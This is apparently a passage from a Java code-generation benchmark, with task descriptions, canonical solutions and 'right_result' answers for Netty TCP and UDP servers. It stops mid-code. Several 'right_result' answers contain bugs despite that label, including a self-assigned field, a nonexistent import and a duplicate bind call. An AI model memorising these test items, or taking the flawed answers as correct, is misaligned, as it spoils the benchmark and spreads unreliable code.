    "Instruction": "Task Description: Create a Java class that implements a fake Docker server using Netty TCP server technology to intercept and record HTTP requests while responding with empty JSON responses.\n\nClass Description: The FakeDockerServer class simulates a Docker API server for testing purposes. It captures incoming HTTP requests and responds with a static JSON response. The server uses Netty's NIO event loop groups for handling connections and implements graceful shutdown capabilities.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- parent: NioEventLoopGroup - The parent event loop group for accepting connections\n- child: NioEventLoopGroup - The child event loop group for handling connections\n- requests: List<HttpRequest> - Stores all received HTTP requests for inspection\n- channel: Channel - The server's communication channel\n\nMethods:\n- FakeDockerServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> void - Starts the server and configures request handling pipeline\n- stop() -> void - Stops the server and releases resources gracefully\n- getRequests() -> List<HttpRequest> - Returns the list of captured HTTP requests",
    "Canonical_solution": "import com.github.dockerjava.api.DockerClient;\nimport com.github.dockerjava.core.DefaultDockerClientConfig;\nimport com.github.dockerjava.core.DockerClientBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_LENGTH;\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_TYPE;\nimport static io.netty.handler.codec.http.HttpResponseStatus.OK;\nimport static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;\n\npublic class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests = new ArrayList<>();\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(parent, child)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel socketChannel) throws Exception {\n                    ChannelPipeline pipeline = socketChannel.pipeline();\n                    pipeline.addLast(\"codec\", new HttpServerCodec());\n                    pipeline.addLast(\"httpHandler\", new SimpleChannelInboundHandler<Object>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext context, Object message) throws Exception {\n                            if (message instanceof HttpRequest) {\n                                HttpRequest request = (HttpRequest) message;\n                                requests.add(request);\n                            }\n\n                            if (message instanceof HttpContent) {\n                                FullHttpResponse response = new DefaultFullHttpResponse(HTTP_1_1, OK, Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8));\n                                response.headers().set(CONTENT_TYPE, \"application/json; charset=UTF-8\");\n                                response.headers().set(CONTENT_LENGTH, response.content().readableBytes());\n                                context.writeAndFlush(response);\n                            }\n                        }\n                    });\n                }\n            });\n\n        channel = bootstrap.bind(port).syncUninterruptibly().channel();\n    }\n\n    public void stop() throws Exception {\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n        channel.closeFuture().sync();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBufUtil;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class FakeDockerServer {\n    private final int port;\n    private NioEventLoopGroup parent;\n    private NioEventLoopGroup child;\n    private Channel channel;\n    private List<HttpRequest> requests = new ArrayList<>();\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        parent = new NioEventLoopGroup();\n        child = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(parent, child)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new RequestHandler());\n                 }\n             });\n            ChannelFuture f = b.bind(port).sync();\n            channel = f.channel().closeFuture().sync().channel();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close();\n        }\n        if (child != null) {\n            child.shutdownGracefully();\n        }\n        if (parent != null) {\n            parent.shutdownGracefully();\n        }\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n\n    private class RequestHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            requests.add(msg);\n            FullHttpResponse response = new DefaultFullHttpResponse(\n                    HttpVersion.HTTP_1_1,\n                    HttpResponseStatus.OK,\n                    Unpooled.copiedBuffer(\"{\\\"status\\\":\\\"success\\\"}\".getBytes())\n            );\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/json\");\n            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that handles client connections and processes Protocol Buffers (protobuf) messages with support for idle connection detection and custom message handling.\n\nClass Description: ProtobufProxy is a Netty-based TCP server implementation that establishes a server socket, configures protocol buffer message handling, and manages client connections. It includes idle connection detection, protobuf message encoding/decoding, and custom business logic handlers.\n\nAttributes: None (This class doesn't maintain any instance attributes, using local variables within methods instead)\n\nMethods:\n1: start(int port) -> void - Initializes and starts the Netty TCP server on the specified port. Creates event loop groups, configures server bootstrap with protobuf handlers, binds to the port, and manages server lifecycle. The method blocks until server shutdown.\n   - Input Parameters:\n     - port: int - The TCP port number to bind the server to\n   - Output: None (void)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.entity.ServerTransferData;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\nimport org.nico.ratel.landlords.server.ServerContains;\nimport org.nico.ratel.landlords.server.handler.SecondProtobufCodec;\nimport org.nico.ratel.landlords.server.handler.ProtobufTransferHandler;\n\nimport java.net.InetSocketAddress;\nimport java.util.Timer;\nimport java.util.concurrent.TimeUnit;\n\npublic class ProtobufProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                .addLast(new ProtobufVarint32FrameDecoder())\n                                .addLast(new ProtobufDecoder(ServerTransferData.ServerTransferDataProtoc.getDefaultInstance()))\n                                .addLast(new ProtobufVarint32LengthFieldPrepender())\n                                .addLast(new ProtobufEncoder())\n                                .addLast(new SecondProtobufCodec())\n                                .addLast(new ProtobufTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The protobuf server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n\n            ServerContains.THREAD_EXCUTER.execute(() -> {\n                Timer timer = new Timer();\n                timer.schedule(new RoomClearTask(), 0L, 3000L);\n            });\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.protobuf.ProtobufDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class ProtobufProxy {\n\n    public static void start(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new IdleStateHandler(0, 0, 60)); // Idle connection detection every 60 seconds\n                     p.addLast(new ProtobufDecoder(YourProtobufMessage.getDefaultInstance()));\n                     p.addLast(new ProtobufEncoder());\n                     p.addLast(new CustomBusinessLogicHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class CustomBusinessLogicHandler extends io.netty.channel.SimpleChannelInboundHandler<YourProtobufMessage> {\n        @Override\n        protected void channelRead0(io.netty.channel.ChannelHandlerContext ctx, YourProtobufMessage msg) throws Exception {\n            // Handle custom business logic here\n        }\n\n        @Override\n        public void userEventTriggered(io.netty.channel.ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof io.netty.handler.timeout.IdleStateEvent) {\n                ctx.close(); // Close connection if it's idle\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework for backup communication in a distributed system. The server should handle incoming UDP packets, decode them, and process messages while managing resources efficiently.\n\nClass Description: BackupServer is an AutoCloseable class that establishes a Netty-based UDP server for backup communication. It manages network connections, message handling, and graceful shutdown procedures.\n\nAttributes:\n- commonParameter: [CommonParameter] - Configuration parameters for the backup server\n- port: [int] - Port number to bind the UDP server\n- backupManager: [BackupManager] - Manager for backup operations\n- channel: [Channel] - Netty channel for UDP communication\n- shutdown: [boolean] - Flag indicating server shutdown status\n- executor: [ExecutorService] - Thread executor for server operations\n\nMethods:\n- initServer(): [void]() -> [void] - Initializes and starts the backup server in a separate thread if conditions are met\n- start(): [void]() throws [Exception] - Configures and starts the Netty UDP server with proper handlers\n- close(): [void]() -> [void] - Implements AutoCloseable to gracefully shutdown the server and release resources\n\nConstructor:\n- BackupServer([BackupManager backupManager]) - Creates a new instance with the specified BackupManager",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.common.backup.BackupManager;\nimport org.tron.common.es.ExecutorServiceManager;\nimport org.tron.common.parameter.CommonParameter;\nimport org.tron.p2p.stats.TrafficStats;\n\npublic class BackupServer implements AutoCloseable {\n\n  private CommonParameter commonParameter = CommonParameter.getInstance();\n  private int port = commonParameter.getBackupPort();\n  private BackupManager backupManager;\n  private Channel channel;\n  private volatile boolean shutdown = false;\n  private ExecutorService executor;\n\n  public BackupServer(final BackupManager backupManager) {\n    this.backupManager = backupManager;\n  }\n\n  public void initServer() {\n    if (port > 0 && commonParameter.getBackupMembers().size() > 0) {\n      executor = ExecutorServiceManager.newSingleThreadExecutor(\"BackupServer\");\n      executor.submit(() -> {\n        try {\n          start();\n        } catch (Exception e) {\n          logger.error(\"Start backup server failed, {}\", e);\n        }\n      });\n    }\n  }\n\n  private void start() throws Exception {\n    NioEventLoopGroup group = new NioEventLoopGroup(1);\n    try {\n      while (!shutdown) {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n            .channel(NioDatagramChannel.class)\n            .handler(new ChannelInitializer<NioDatagramChannel>() {\n              @Override\n              public void initChannel(NioDatagramChannel ch) throws Exception {\n                ch.pipeline().addLast(TrafficStats.udp);\n                ch.pipeline().addLast(new ProtobufVarint32LengthFieldPrepender());\n                ch.pipeline().addLast(new ProtobufVarint32FrameDecoder());\n                ch.pipeline().addLast(new PacketDecoder());\n                MessageHandler messageHandler = new MessageHandler(ch, backupManager);\n                backupManager.setMessageHandler(messageHandler);\n                ch.pipeline().addLast(messageHandler);\n              }\n            });\n\n        channel = b.bind(port).sync().channel();\n        channel.closeFuture().sync();\n        if (shutdown) {\n          break;\n        }\n      }\n    } finally {\n      group.shutdownGracefully().sync();\n    }\n  }\n\n  @Override\n  public void close() {\n    shutdown = true;\n    backupManager.stop();\n    if (channel != null) {\n      try {\n        channel.close().await(10, TimeUnit.SECONDS);\n      } catch (Exception e) {\n        logger.warn(\"Closing backup server failed.\", e);\n      }\n    }\n    ExecutorServiceManager.shutdownAndAwaitTermination(executor, \"BackupServer\");\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class BackupServer implements AutoCloseable {\n    private final CommonParameter commonParameter;\n    private final int port;\n    private final BackupManager backupManager;\n    private Channel channel;\n    private boolean shutdown = false;\n    private ExecutorService executor;\n\n    public BackupServer(BackupManager backupManager) {\n        this.commonParameter = commonParameter;\n        this.port = commonParameter.getUdpPort();\n        this.backupManager = backupManager;\n        this.executor = Executors.newSingleThreadExecutor();\n    }\n\n    public void initServer() {\n        executor.submit(() -> {\n            try {\n                start();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioDatagramChannel.class)\n             .option(ChannelOption.SO_BROADCAST, true)\n             .handler(new SimpleChannelInboundHandler<DatagramPacket>() {\n                 @Override\n                 protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket msg) throws Exception {\n                     // Process incoming message\n                     String receivedMessage = msg.content().toString(io.netty.util.CharsetUtil.UTF_8);\n                     backupManager.processMessage(receivedMessage);\n                 }\n             });\n\n            channel = b.bind(port).sync().channel();\n            System.out.println(\"UDP Server started on port \" + port);\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void close() {\n        if (!shutdown) {\n            shutdown = true;\n            channel.close();\n            executor.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 234,
    "Instruction": "Task Description: Create a Java class that implements a UDP echo server using Netty framework, capable of receiving datagrams and echoing them back to the sender.\n\nClass Description: DatagramChannelEchoServer is a Netty-based UDP server that listens on a specified port, receives incoming datagrams, and echoes them back to the sender. The server handles network operations asynchronously and includes proper resource cleanup.\n\nAttributes:\n- group: [NioEventLoopGroup] - Handles I/O operations asynchronously\n- bootstrap: [Bootstrap] - Configures and initializes the Netty server\n- channelFuture: [ChannelFuture] - Represents the result of an asynchronous channel operation\n- DEFAULT_PORT: [int] - Default port number (7) if none specified\n\nMethods:\n- start([int port]) -> [void] - Starts the UDP server on the specified port, initializes Netty components, and binds to the port\n- shutdown() -> [void] - Gracefully shuts down the server and releases resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server\n\nThe class should use NioDatagramChannel for UDP transport, enable SO_BROADCAST option, and include proper error handling and resource cleanup. The server should continue running until explicitly stopped, echoing all received datagrams back to their senders.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\npublic class DatagramChannelEchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup group;\n    private Bootstrap bootstrap;\n    private ChannelFuture channelFuture;\n\n    public void start(int port) throws Exception {\n        group = new NioEventLoopGroup();\n        \n        try {\n            bootstrap = new Bootstrap();\n            \n            bootstrap.group(group)\n                .channel(NioDatagramChannel.class)\n                .option(ChannelOption.SO_BROADCAST, true)\n                .handler(new DatagramChannelEchoServerHandler());\n            \n            channelFuture = bootstrap.bind(port).sync();\n            System.out.println(\"DatagramChannelEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            \n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramPacket;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\n\npublic class DatagramChannelEchoServer {\n    private EventLoopGroup group = new NioEventLoopGroup();\n    private Bootstrap bootstrap = new Bootstrap();\n    private ChannelFuture channelFuture;\n\n    public static final int DEFAULT_PORT = 7;\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(group)\n                    .channel(NioDatagramChannel.class)\n                    .option(ChannelOption.SO_BROADCAST, true)\n                    .handler(new ChannelInitializer<NioDatagramChannel>() {\n                        @Override\n                        protected void initChannel(NioDatagramChannel ch) throws Exception {\n                            ch.pipeline().addLast(new SimpleChannelInboundHandler<DatagramPacket>() {\n                                @Override\n                                protected void channelRead0(ChannelHandlerContext ctx, DatagramPacket msg) throws Exception {\n                                    ByteBuf content = msg.content();\n                                    ctx.writeAndFlush(new DatagramPacket(content.copy(), msg.sender()));\n                                }\n                            });\n                        }\n                    });\n\n            channelFuture = bootstrap.bind(port).sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        channelFuture.cancel(true);\n        group.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        DatagramChannelEchoServer server = new DatagramChannelEchoServer();\n        try {\n            server.start(port);\n            System.out.println(\"UDP Echo Server started on port \" + port);\n            System.in.read();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            server.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework, with support for multiple transport types (NIO, Epoll, KQueue, IOUring) and graceful shutdown capabilities.\n\nClass Description: GeyserServer is a Netty-based UDP server implementation that handles network communication using the most optimal transport available on the system. It manages server lifecycle including binding to ports and graceful shutdown.\n\nAttributes:\n- TRANSPORT: [Transport] - Static final field holding the best available transport type\n- SHUTDOWN_QUIET_PERIOD_MS: [int] - Milliseconds to wait for quiet period during shutdown\n- SHUTDOWN_TIMEOUT_MS: [int] - Maximum milliseconds to wait for shutdown\n- geyser: [GeyserImpl] - Reference to the main Geyser implementation\n- group: [EventLoopGroup] - Parent event loop group for the server\n- childGroup: [EventLoopGroup] - Child event loop group for handling connections\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- playerGroup: [EventLoopGroup] - Event loop group for player connections\n- bootstrapFutures: [ChannelFuture[]] - Array of channel futures for server binding\n\nMethods:\n- GeyserServer([GeyserImpl geyser, int threadCount]) -> [void] - Constructor that initializes the server with specified thread count\n- bind([InetSocketAddress address]) -> [CompletableFuture<Void>] - Binds the server to the specified address and returns a future\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- createBootstrap() -> [ServerBootstrap] - Private method that creates and configures the server bootstrap\n- compatibleTransport() -> [Transport] - Static private method that detects the best available transport\n- isClassAvailable([String className]) -> [boolean] - Static private helper method to check class availability\n\nNested Types:\n- Transport: [record] - Holds transport-specific channel class and event loop group factory",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueue;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUring;\nimport io.netty.incubator.channel.uring.IOUringDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUringEventLoopGroup;\nimport io.netty.util.concurrent.Future;\nimport org.cloudburstmc.netty.channel.raknet.RakChannelFactory;\nimport org.cloudburstmc.netty.channel.raknet.config.RakChannelOption;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.IntFunction;\n\npublic final class GeyserServer {\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 500;\n\n    private final GeyserImpl geyser;\n    private EventLoopGroup group;\n    private EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory().apply(1);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory().apply(threadCount);\n        this.bootstrap = this.createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures = new ChannelFuture[1];\n        ChannelFuture future = bootstrap.bind(address);\n        bootstrapFutures[0] = future;\n        return Bootstraps.allOf(bootstrapFutures);\n    }\n\n    public void shutdown() {\n        try {\n            Future<?> futureChildGroup = this.childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.childGroup = null;\n            Future<?> futureGroup = this.group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.group = null;\n            Future<?> futurePlayerGroup = this.playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.playerGroup = null;\n\n            futureChildGroup.sync();\n            futureGroup.sync();\n            futurePlayerGroup.sync();\n        } catch (InterruptedException e) {\n            GeyserImpl.getInstance().getLogger().severe(\"Exception in shutdown process\", e);\n        }\n        for (ChannelFuture f : bootstrapFutures) {\n            f.channel().closeFuture().syncUninterruptibly();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        GeyserServerInitializer serverInitializer = new GeyserServerInitializer(this.geyser);\n        playerGroup = serverInitializer.getEventLoopGroup();\n\n        return new ServerBootstrap()\n                .channelFactory(RakChannelFactory.server(TRANSPORT.datagramChannel()))\n                .group(group, childGroup)\n                .childHandler(serverInitializer);\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUring\")\n                && IOUring.isAvailable()\n                && Boolean.parseBoolean(System.getProperty(\"Geyser.io_uring\"))) {\n            return new Transport(IOUringDatagramChannel.class, IOUringEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\") && Epoll.isAvailable()) {\n            return new Transport(EpollDatagramChannel.class, EpollEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\") && KQueue.isAvailable()) {\n            return new Transport(KQueueDatagramChannel.class, KQueueEventLoopGroup::new);\n        }\n\n        return new Transport(NioDatagramChannel.class, NioEventLoopGroup::new);\n    }\n\n    private record Transport(Class<? extends DatagramChannel> datagramChannel, IntFunction<EventLoopGroup> eventLoopGroupFactory) {\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.util.concurrent.Future;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\n\npublic class GeyserServer {\n    public static final Transport TRANSPORT = compatibleTransport();\n    public static final int SHUTDOWN_QUIET_PERIOD_MS = 2000;\n    public static final int SHUTDOWN_TIMEOUT_MS = 5000;\n    private final GeyserImpl geyser;\n    private final EventLoopGroup group;\n    private final EventLoopGroup childGroup;\n    private ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory.create(threadCount);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory.create(threadCount);\n        this.bootstrap = createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        CompletableFuture<Void> future = new CompletableFuture<>();\n        bootstrap.bind(address).addListener(future::completeExceptionally);\n        bootstrapFutures = new ChannelFuture[]{bootstrap.bind(address)};\n        return future;\n    }\n\n    public void shutdown() {\n        if (bootstrapFutures != null) {\n            for (ChannelFuture future : bootstrapFutures) {\n                future.channel().close();\n            }\n        }\n        group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        if (playerGroup != null) {\n            playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS);\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(group, childGroup)\n         .channel(TRANSPORT.channelClass())\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 // Initialize pipeline here\n             }\n         });\n        return b;\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.channel.epoll.EpollEventLoopGroup\")) {\n            return new Transport(EpollServerSocketChannel.class, () -> new EpollEventLoopGroup());\n        } else if 